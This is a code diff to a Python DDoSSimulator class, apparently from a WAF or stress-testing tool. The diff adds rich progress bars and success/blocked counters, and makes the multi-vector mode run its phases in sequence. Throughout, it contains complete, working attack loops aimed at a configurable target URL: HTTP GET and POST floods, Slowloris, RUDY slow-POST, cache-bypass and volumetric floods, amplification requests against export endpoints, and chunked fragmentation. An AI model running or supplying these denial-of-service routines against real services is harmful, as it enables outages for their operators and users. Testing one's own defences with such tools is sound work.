@@ -5,14 +5,20 @@ import random
 import string
 import time
 from enum import Enum, auto
-from typing import Dict, List, Optional, Any
+from typing import Dict, List, Optional, Any, Callable
 from dataclasses import dataclass, field
 import logging
+
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn, TimeElapsedColumn, TaskProgressColumn
+from rich.live import Live
+from rich.console import Console
+from rich.table import Table
 
 from .http_engine import HTTPEngine, HTTPMethod, HTTPResponse
 from .config import Config
 
 logger = logging.getLogger(__name__)
+console = Console()
 
 
 class DDoSAttackType(Enum):
@@ -70,13 +76,21 @@ class DDoSSimulator:
         self.http_engine = http_engine
         self.config = config
         self.results: List[DDoSTestResult] = []
+        self.progress: Optional[Progress] = None
+        self.current_task = None
+        self.completed_requests = 0
+        self.blocked_count = 0
+        self.success_count = 0
     
     async def run(self) -> List[DDoSTestResult]:
         """Run the configured DDoS tests."""
         attack_type = DDoSAttackType(self.config.ddos_attack_type)
         
         for target in self.config.get_target_urls():
-            logger.info(f"Starting {attack_type.name} test against {target}")
+            console.print(f"\n[bold cyan]Target:[/] {target}")
+            console.print(f"[bold cyan]Attack Type:[/] {attack_type.name}")
+            console.print(f"[bold cyan]Total Requests:[/] {self.config.request_count}")
+            console.print(f"[bold cyan]Concurrency:[/] {self.config.concurrency}\n")
             
             result = await self._run_attack(attack_type, target)
             self.results.append(result)
@@ -112,26 +126,56 @@ class DDoSSimulator:
         """HTTP GET flood attack simulation."""
         responses: List[HTTPResponse] = []
         start_time = time.time()
+        self.completed_requests = 0
+        self.blocked_count = 0
+        self.success_count = 0
         
         semaphore = asyncio.Semaphore(self.config.concurrency)
         
-        async def make_request(i: int):
-            async with semaphore:
-                params = {
-                    "_": str(int(time.time() * 1000)),
-                    "r": str(random.randint(1, 1000000))
-                }
-                
-                response = await self.http_engine.request(
-                    target,
-                    HTTPMethod.GET,
-                    params=params,
-                    timeout=self.config.timeout
-                )
-                responses.append(response)
-        
-        tasks = [make_request(i) for i in range(self.config.request_count)]
-        await asyncio.gather(*tasks)
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold blue]{task.description}"),
+            BarColumn(bar_width=40),
+            TaskProgressColumn(),
+            TextColumn("|"),
+            TextColumn("[green]OK:{task.fields[success]}"),
+            TextColumn("[red]Blocked:{task.fields[blocked]}"),
+            TextColumn("|"),
+            TimeElapsedColumn(),
+            console=console,
+            refresh_per_second=10
+        ) as progress:
+            task = progress.add_task(
+                "HTTP GET Flood",
+                total=self.config.request_count,
+                success=0,
+                blocked=0
+            )
+            
+            async def make_request(i: int):
+                async with semaphore:
+                    params = {
+                        "_": str(int(time.time() * 1000)),
+                        "r": str(random.randint(1, 1000000))
+                    }
+                    
+                    response = await self.http_engine.request(
+                        target,
+                        HTTPMethod.GET,
+                        params=params,
+                        timeout=self.config.timeout
+                    )
+                    responses.append(response)
+                    
+                    if response.blocked:
+                        self.blocked_count += 1
+                    elif response.status_code in range(200, 400):
+                        self.success_count += 1
+                    
+                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
+            
+            tasks = [make_request(i) for i in range(self.config.request_count)]
+            await asyncio.gather(*tasks)
         
         duration = time.time() - start_time
         return self._compile_results(attack_type, target, responses, duration)
@@ -140,28 +184,58 @@ class DDoSSimulator:
         """HTTP POST flood attack simulation."""
         responses: List[HTTPResponse] = []
         start_time = time.time()
+        self.completed_requests = 0
+        self.blocked_count = 0
+        self.success_count = 0
         
         semaphore = asyncio.Semaphore(self.config.concurrency)
         
-        async def make_request(i: int):
-            async with semaphore:
-                data = {
-                    "data": ''.join(random.choices(string.ascii_letters, k=random.randint(100, 1000))),
-                    "timestamp": str(time.time()),
-                    "id": str(random.randint(1, 1000000))
-                }
-                
-                response = await self.http_engine.request(
-                    target,
-                    HTTPMethod.POST,
-                    data=data,
-                    headers={"Content-Type": "application/x-www-form-urlencoded"},
-                    timeout=self.config.timeout
-                )
-                responses.append(response)
-        
-        tasks = [make_request(i) for i in range(self.config.request_count)]
-        await asyncio.gather(*tasks)
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold blue]{task.description}"),
+            BarColumn(bar_width=40),
+            TaskProgressColumn(),
+            TextColumn("|"),
+            TextColumn("[green]OK:{task.fields[success]}"),
+            TextColumn("[red]Blocked:{task.fields[blocked]}"),
+            TextColumn("|"),
+            TimeElapsedColumn(),
+            console=console,
+            refresh_per_second=10
+        ) as progress:
+            task = progress.add_task(
+                "HTTP POST Flood",
+                total=self.config.request_count,
+                success=0,
+                blocked=0
+            )
+            
+            async def make_request(i: int):
+                async with semaphore:
+                    data = {
+                        "data": ''.join(random.choices(string.ascii_letters, k=random.randint(100, 1000))),
+                        "timestamp": str(time.time()),
+                        "id": str(random.randint(1, 1000000))
+                    }
+                    
+                    response = await self.http_engine.request(
+                        target,
+                        HTTPMethod.POST,
+                        data=data,
+                        headers={"Content-Type": "application/x-www-form-urlencoded"},
+                        timeout=self.config.timeout
+                    )
+                    responses.append(response)
+                    
+                    if response.blocked:
+                        self.blocked_count += 1
+                    elif response.status_code in range(200, 400):
+                        self.success_count += 1
+                    
+                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
+            
+            tasks = [make_request(i) for i in range(self.config.request_count)]
+            await asyncio.gather(*tasks)
         
         duration = time.time() - start_time
         return self._compile_results(attack_type, target, responses, duration)
@@ -173,31 +247,61 @@ class DDoSSimulator:
         """
         responses: List[HTTPResponse] = []
         start_time = time.time()
+        self.blocked_count = 0
+        self.success_count = 0
+        request_count = min(self.config.request_count, 100)
         
         semaphore = asyncio.Semaphore(self.config.concurrency)
         
-        async def slow_request(i: int):
-            async with semaphore:
-                headers = {
-                    "X-a": "b",
-                    f"X-Custom-{i}": ''.join(random.choices(string.ascii_letters, k=50)),
-                }
-                
-                for j in range(5):
-                    headers[f"X-Slow-{j}"] = ''.join(random.choices(string.ascii_letters, k=100))
-                
-                response = await self.http_engine.request(
-                    target,
-                    HTTPMethod.GET,
-                    headers=headers,
-                    timeout=self.config.timeout
-                )
-                
-                await asyncio.sleep(random.uniform(0.5, 2.0))
-                responses.append(response)
-        
-        tasks = [slow_request(i) for i in range(min(self.config.request_count, 100))]
-        await asyncio.gather(*tasks)
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold blue]{task.description}"),
+            BarColumn(bar_width=40),
+            TaskProgressColumn(),
+            TextColumn("|"),
+            TextColumn("[green]OK:{task.fields[success]}"),
+            TextColumn("[red]Blocked:{task.fields[blocked]}"),
+            TextColumn("|"),
+            TimeElapsedColumn(),
+            console=console,
+            refresh_per_second=10
+        ) as progress:
+            task = progress.add_task(
+                "Slowloris Attack",
+                total=request_count,
+                success=0,
+                blocked=0
+            )
+            
+            async def slow_request(i: int):
+                async with semaphore:
+                    headers = {
+                        "X-a": "b",
+                        f"X-Custom-{i}": ''.join(random.choices(string.ascii_letters, k=50)),
+                    }
+                    
+                    for j in range(5):
+                        headers[f"X-Slow-{j}"] = ''.join(random.choices(string.ascii_letters, k=100))
+                    
+                    response = await self.http_engine.request(
+                        target,
+                        HTTPMethod.GET,
+                        headers=headers,
+                        timeout=self.config.timeout
+                    )
+                    
+                    await asyncio.sleep(random.uniform(0.5, 2.0))
+                    responses.append(response)
+                    
+                    if response.blocked:
+                        self.blocked_count += 1
+                    elif response.status_code in range(200, 400):
+                        self.success_count += 1
+                    
+                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
+            
+            tasks = [slow_request(i) for i in range(request_count)]
+            await asyncio.gather(*tasks)
         
         duration = time.time() - start_time
         result = self._compile_results(attack_type, target, responses, duration)
@@ -211,31 +315,61 @@ class DDoSSimulator:
         """
         responses: List[HTTPResponse] = []
         start_time = time.time()
+        self.blocked_count = 0
+        self.success_count = 0
+        request_count = min(self.config.request_count, 50)
         
         semaphore = asyncio.Semaphore(self.config.concurrency)
         
-        async def rudy_request(i: int):
-            async with semaphore:
-                headers = {
-                    "Content-Type": "application/x-www-form-urlencoded",
-                    "Content-Length": str(random.randint(10000, 100000)),
-                }
-                
-                small_data = ''.join(random.choices(string.ascii_letters, k=10))
-                
-                response = await self.http_engine.request(
-                    target,
-                    HTTPMethod.POST,
-                    headers=headers,
-                    data=small_data,
-                    timeout=self.config.timeout
-                )
-                
-                await asyncio.sleep(random.uniform(1.0, 3.0))
-                responses.append(response)
-        
-        tasks = [rudy_request(i) for i in range(min(self.config.request_count, 50))]
-        await asyncio.gather(*tasks)
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold blue]{task.description}"),
+            BarColumn(bar_width=40),
+            TaskProgressColumn(),
+            TextColumn("|"),
+            TextColumn("[green]OK:{task.fields[success]}"),
+            TextColumn("[red]Blocked:{task.fields[blocked]}"),
+            TextColumn("|"),
+            TimeElapsedColumn(),
+            console=console,
+            refresh_per_second=10
+        ) as progress:
+            task = progress.add_task(
+                "RUDY Attack",
+                total=request_count,
+                success=0,
+                blocked=0
+            )
+            
+            async def rudy_request(i: int):
+                async with semaphore:
+                    headers = {
+                        "Content-Type": "application/x-www-form-urlencoded",
+                        "Content-Length": str(random.randint(10000, 100000)),
+                    }
+                    
+                    small_data = ''.join(random.choices(string.ascii_letters, k=10))
+                    
+                    response = await self.http_engine.request(
+                        target,
+                        HTTPMethod.POST,
+                        headers=headers,
+                        data=small_data,
+                        timeout=self.config.timeout
+                    )
+                    
+                    await asyncio.sleep(random.uniform(1.0, 3.0))
+                    responses.append(response)
+                    
+                    if response.blocked:
+                        self.blocked_count += 1
+                    elif response.status_code in range(200, 400):
+                        self.success_count += 1
+                    
+                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
+            
+            tasks = [rudy_request(i) for i in range(request_count)]
+            await asyncio.gather(*tasks)
         
         duration = time.time() - start_time
         result = self._compile_results(attack_type, target, responses, duration)
@@ -249,6 +383,8 @@ class DDoSSimulator:
         """
         responses: List[HTTPResponse] = []
         start_time = time.time()
+        self.blocked_count = 0
+        self.success_count = 0
         
         semaphore = asyncio.Semaphore(self.config.concurrency)
         
@@ -261,35 +397,62 @@ class DDoSSimulator:
             "/data",
         ]
         
-        async def cache_bypass_request(i: int):
-            async with semaphore:
-                path = random.choice(paths)
-                params = {
-                    "_": str(int(time.time() * 1000000)),
-                    "cb": ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
-                    "nocache": "true",
-                    "rand": str(random.randint(1, 10000000)),
-                    "q": ''.join(random.choices(string.ascii_letters, k=random.randint(5, 20))),
-                }
-                
-                headers = {
-                    "Cache-Control": "no-cache, no-store, must-revalidate",
-                    "Pragma": "no-cache",
-                }
-                
-                url = target.rstrip("/") + path
-                
-                response = await self.http_engine.request(
-                    url,
-                    HTTPMethod.GET,
-                    headers=headers,
-                    params=params,
-                    timeout=self.config.timeout
-                )
-                responses.append(response)
-        
-        tasks = [cache_bypass_request(i) for i in range(self.config.request_count)]
-        await asyncio.gather(*tasks)
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold blue]{task.description}"),
+            BarColumn(bar_width=40),
+            TaskProgressColumn(),
+            TextColumn("|"),
+            TextColumn("[green]OK:{task.fields[success]}"),
+            TextColumn("[red]Blocked:{task.fields[blocked]}"),
+            TextColumn("|"),
+            TimeElapsedColumn(),
+            console=console,
+            refresh_per_second=10
+        ) as progress:
+            task = progress.add_task(
+                "Cache Bypass Flood",
+                total=self.config.request_count,
+                success=0,
+                blocked=0
+            )
+            
+            async def cache_bypass_request(i: int):
+                async with semaphore:
+                    path = random.choice(paths)
+                    params = {
+                        "_": str(int(time.time() * 1000000)),
+                        "cb": ''.join(random.choices(string.ascii_lowercase + string.digits, k=16)),
+                        "nocache": "true",
+                        "rand": str(random.randint(1, 10000000)),
+                        "q": ''.join(random.choices(string.ascii_letters, k=random.randint(5, 20))),
+                    }
+                    
+                    headers = {
+                        "Cache-Control": "no-cache, no-store, must-revalidate",
+                        "Pragma": "no-cache",
+                    }
+                    
+                    url = target.rstrip("/") + path
+                    
+                    response = await self.http_engine.request(
+                        url,
+                        HTTPMethod.GET,
+                        headers=headers,
+                        params=params,
+                        timeout=self.config.timeout
+                    )
+                    responses.append(response)
+                    
+                    if response.blocked:
+                        self.blocked_count += 1
+                    elif response.status_code in range(200, 400):
+                        self.success_count += 1
+                    
+                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
+            
+            tasks = [cache_bypass_request(i) for i in range(self.config.request_count)]
+            await asyncio.gather(*tasks)
         
         duration = time.time() - start_time
         result = self._compile_results(attack_type, target, responses, duration)
@@ -308,27 +471,56 @@ class DDoSSimulator:
         """
         responses: List[HTTPResponse] = []
         start_time = time.time()
+        self.blocked_count = 0
+        self.success_count = 0
         
         semaphore = asyncio.Semaphore(self.config.concurrency * 2)
         
-        async def volumetric_request(i: int):
-            async with semaphore:
-                large_param = ''.join(random.choices(string.ascii_letters, k=random.randint(500, 2000)))
-                params = {
-                    "data": large_param,
-                    "id": str(i),
-                }
-                
-                response = await self.http_engine.request(
-                    target,
-                    HTTPMethod.GET,
-                    params=params,
-                    timeout=self.config.timeout
-                )
-                responses.append(response)
-        
-        tasks = [volumetric_request(i) for i in range(self.config.request_count)]
-        await asyncio.gather(*tasks)
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold blue]{task.description}"),
+            BarColumn(bar_width=40),
+            TaskProgressColumn(),
+            TextColumn("|"),
+            TextColumn("[green]OK:{task.fields[success]}"),
+            TextColumn("[red]Blocked:{task.fields[blocked]}"),
+            TextColumn("|"),
+            TimeElapsedColumn(),
+            console=console,
+            refresh_per_second=10
+        ) as progress:
+            task = progress.add_task(
+                f"Volumetric ({attack_type.name})",
+                total=self.config.request_count,
+                success=0,
+                blocked=0
+            )
+            
+            async def volumetric_request(i: int):
+                async with semaphore:
+                    large_param = ''.join(random.choices(string.ascii_letters, k=random.randint(500, 2000)))
+                    params = {
+                        "data": large_param,
+                        "id": str(i),
+                    }
+                    
+                    response = await self.http_engine.request(
+                        target,
+                        HTTPMethod.GET,
+                        params=params,
+                        timeout=self.config.timeout
+                    )
+                    responses.append(response)
+                    
+                    if response.blocked:
+                        self.blocked_count += 1
+                    elif response.status_code in range(200, 400):
+                        self.success_count += 1
+                    
+                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
+            
+            tasks = [volumetric_request(i) for i in range(self.config.request_count)]
+            await asyncio.gather(*tasks)
         
         duration = time.time() - start_time
         result = self._compile_results(attack_type, target, responses, duration)
@@ -343,6 +535,8 @@ class DDoSSimulator:
         """
         responses: List[HTTPResponse] = []
         start_time = time.time()
+        self.blocked_count = 0
+        self.success_count = 0
         
         semaphore = asyncio.Semaphore(self.config.concurrency)
         
@@ -357,27 +551,54 @@ class DDoSSimulator:
             "/api/list",
         ]
         
-        async def amplification_request(i: int):
-            async with semaphore:
-                endpoint = random.choice(amplification_endpoints)
-                url = target.rstrip("/") + endpoint
-                
-                params = {
-                    "limit": "10000",
-                    "all": "true",
-                    "export": "true",
-                }
-                
-                response = await self.http_engine.request(
-                    url,
-                    HTTPMethod.GET,
-                    params=params,
-                    timeout=self.config.timeout
-                )
-                responses.append(response)
-        
-        tasks = [amplification_request(i) for i in range(self.config.request_count)]
-        await asyncio.gather(*tasks)
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold blue]{task.description}"),
+            BarColumn(bar_width=40),
+            TaskProgressColumn(),
+            TextColumn("|"),
+            TextColumn("[green]OK:{task.fields[success]}"),
+            TextColumn("[red]Blocked:{task.fields[blocked]}"),
+            TextColumn("|"),
+            TimeElapsedColumn(),
+            console=console,
+            refresh_per_second=10
+        ) as progress:
+            task = progress.add_task(
+                f"Amplification ({attack_type.name})",
+                total=self.config.request_count,
+                success=0,
+                blocked=0
+            )
+            
+            async def amplification_request(i: int):
+                async with semaphore:
+                    endpoint = random.choice(amplification_endpoints)
+                    url = target.rstrip("/") + endpoint
+                    
+                    params = {
+                        "limit": "10000",
+                        "all": "true",
+                        "export": "true",
+                    }
+                    
+                    response = await self.http_engine.request(
+                        url,
+                        HTTPMethod.GET,
+                        params=params,
+                        timeout=self.config.timeout
+                    )
+                    responses.append(response)
+                    
+                    if response.blocked:
+                        self.blocked_count += 1
+                    elif response.status_code in range(200, 400):
+                        self.success_count += 1
+                    
+                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
+            
+            tasks = [amplification_request(i) for i in range(self.config.request_count)]
+            await asyncio.gather(*tasks)
         
         duration = time.time() - start_time
         result = self._compile_results(attack_type, target, responses, duration)
@@ -391,20 +612,49 @@ class DDoSSimulator:
         """
         responses: List[HTTPResponse] = []
         start_time = time.time()
+        self.blocked_count = 0
+        self.success_count = 0
         
         semaphore = asyncio.Semaphore(self.config.concurrency * 2)
         
-        async def protocol_request(i: int):
-            async with semaphore:
-                response = await self.http_engine.request(
-                    target,
-                    HTTPMethod.HEAD,
-                    timeout=5
-                )
-                responses.append(response)
-        
-        tasks = [protocol_request(i) for i in range(self.config.request_count)]
-        await asyncio.gather(*tasks)
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold blue]{task.description}"),
+            BarColumn(bar_width=40),
+            TaskProgressColumn(),
+            TextColumn("|"),
+            TextColumn("[green]OK:{task.fields[success]}"),
+            TextColumn("[red]Blocked:{task.fields[blocked]}"),
+            TextColumn("|"),
+            TimeElapsedColumn(),
+            console=console,
+            refresh_per_second=10
+        ) as progress:
+            task = progress.add_task(
+                f"Protocol ({attack_type.name})",
+                total=self.config.request_count,
+                success=0,
+                blocked=0
+            )
+            
+            async def protocol_request(i: int):
+                async with semaphore:
+                    response = await self.http_engine.request(
+                        target,
+                        HTTPMethod.HEAD,
+                        timeout=5
+                    )
+                    responses.append(response)
+                    
+                    if response.blocked:
+                        self.blocked_count += 1
+                    elif response.status_code in range(200, 400):
+                        self.success_count += 1
+                    
+                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
+            
+            tasks = [protocol_request(i) for i in range(self.config.request_count)]
+            await asyncio.gather(*tasks)
         
         duration = time.time() - start_time
         result = self._compile_results(attack_type, target, responses, duration)
@@ -419,33 +669,62 @@ class DDoSSimulator:
         """
         responses: List[HTTPResponse] = []
         start_time = time.time()
+        self.blocked_count = 0
+        self.success_count = 0
         
         semaphore = asyncio.Semaphore(self.config.concurrency)
         
-        async def fragmented_request(i: int):
-            async with semaphore:
-                fragments = []
-                for _ in range(random.randint(5, 20)):
-                    fragment = ''.join(random.choices(string.ascii_letters, k=random.randint(10, 100)))
-                    fragments.append(fragment)
-                
-                headers = {
-                    "Transfer-Encoding": "chunked",
-                }
-                
-                data = "\r\n".join(fragments)
-                
-                response = await self.http_engine.request(
-                    target,
-                    HTTPMethod.POST,
-                    headers=headers,
-                    data=data,
-                    timeout=self.config.timeout
-                )
-                responses.append(response)
-        
-        tasks = [fragmented_request(i) for i in range(self.config.request_count)]
-        await asyncio.gather(*tasks)
+        with Progress(
+            SpinnerColumn(),
+            TextColumn("[bold blue]{task.description}"),
+            BarColumn(bar_width=40),
+            TaskProgressColumn(),
+            TextColumn("|"),
+            TextColumn("[green]OK:{task.fields[success]}"),
+            TextColumn("[red]Blocked:{task.fields[blocked]}"),
+            TextColumn("|"),
+            TimeElapsedColumn(),
+            console=console,
+            refresh_per_second=10
+        ) as progress:
+            task = progress.add_task(
+                "Fragmentation Attack",
+                total=self.config.request_count,
+                success=0,
+                blocked=0
+            )
+            
+            async def fragmented_request(i: int):
+                async with semaphore:
+                    fragments = []
+                    for _ in range(random.randint(5, 20)):
+                        fragment = ''.join(random.choices(string.ascii_letters, k=random.randint(10, 100)))
+                        fragments.append(fragment)
+                    
+                    headers = {
+                        "Transfer-Encoding": "chunked",
+                    }
+                    
+                    data = "\r\n".join(fragments)
+                    
+                    response = await self.http_engine.request(
+                        target,
+                        HTTPMethod.POST,
+                        headers=headers,
+                        data=data,
+                        timeout=self.config.timeout
+                    )
+                    responses.append(response)
+                    
+                    if response.blocked:
+                        self.blocked_count += 1
+                    elif response.status_code in range(200, 400):
+                        self.success_count += 1
+                    
+                    progress.update(task, advance=1, success=self.success_count, blocked=self.blocked_count)
+            
+            tasks = [fragmented_request(i) for i in range(self.config.request_count)]
+            await asyncio.gather(*tasks)
         
         duration = time.time() - start_time
         result = self._compile_results(attack_type, target, responses, duration)
@@ -459,6 +738,8 @@ class DDoSSimulator:
         all_responses: List[HTTPResponse] = []
         start_time = time.time()
         
+        console.print("[bold yellow]Running Multi-Vector Attack (3 phases)...[/]\n")
+        
         attack_methods = [
             (self._http_get_flood, DDoSAttackType.HTTP_GET_FLOOD),
             (self._http_post_flood, DDoSAttackType.HTTP_POST_FLOOD),
@@ -468,16 +749,13 @@ class DDoSSimulator:
         original_count = self.config.request_count
         self.config.request_count = original_count // len(attack_methods)
         
-        tasks = []
-        for method, attack_type in attack_methods:
-            tasks.append(method(attack_type, target))
-        
-        results = await asyncio.gather(*tasks)
+        results = []
+        for i, (method, atk_type) in enumerate(attack_methods, 1):
+            console.print(f"[bold cyan]Phase {i}/{len(attack_methods)}:[/] {atk_type.name}")
+            result = await method(atk_type, target)
+            results.append(result)
         
         self.config.request_count = original_count
-        
-        for result in results:
-            pass
         
         duration = time.time() - start_time
         
